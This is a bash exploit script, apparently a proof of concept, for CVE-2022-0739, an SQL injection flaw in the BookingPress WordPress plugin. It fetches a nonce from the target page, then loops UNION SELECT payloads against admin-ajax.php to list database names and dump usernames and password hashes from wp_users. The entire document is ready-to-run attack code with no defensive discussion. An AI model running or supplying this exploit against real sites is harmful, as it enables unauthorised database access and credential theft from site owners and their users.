figlet -f slant "BookingPress CVE-2022-0739"


url=$1
baseurl=$(echo $url | cut -d '/' -f1-3)

echo "[+] Exploiting $baseurl ..."
echo "[+] Vulnerable url at $url..."

echo "[+] Gettting nonce..."

nonce=$(curl $url 2>/dev/null | grep "nonce" | tr ',' '\n' | grep "nonce" | cut -d "'" -f2 | head -n 1)

echo "[+] Found nonce: $nonce"

printf '[+] Extract database name...\n\n'

for i in `seq 0 20`
do
        table=$(curl  "$baseurl/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=$nonce&category_id=33&total_service=-7502) UNION ALL SELECT schema_name,1,1,1,2,3,4,5,6 FROM information_schema.schemata LIMIT 1 OFFSET $i-- -" 2>/dev/null | tr -d '[' | tr -d ']' | tr ',' '\n' | cut -d '"' -f4 | head -n 1 | tr -d ' ')
        echo $table
        if [ "$table" == "" ]
        then
                break
        fi
done

printf "\n[+] Getting creds...\n"
for i in `seq 0 100`
do
        creds=$(curl $baseurl'/wp-admin/admin-ajax.php' --data "action=bookingpress_front_get_category_services&_wpnonce=$nonce&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_pass,1,1,2,3,4,5,6 FROM wp_users LIMIT 1 OFFSET $i-- -" 2>/dev/null | tr -d '[' | tr -d ']' | tr ',' '\n' | cut -d '"' -f4  | head -n 2 | tr -d ' ')
        echo $creds
        if [ "$creds" == "" ]
        then
                exit
        fi
done
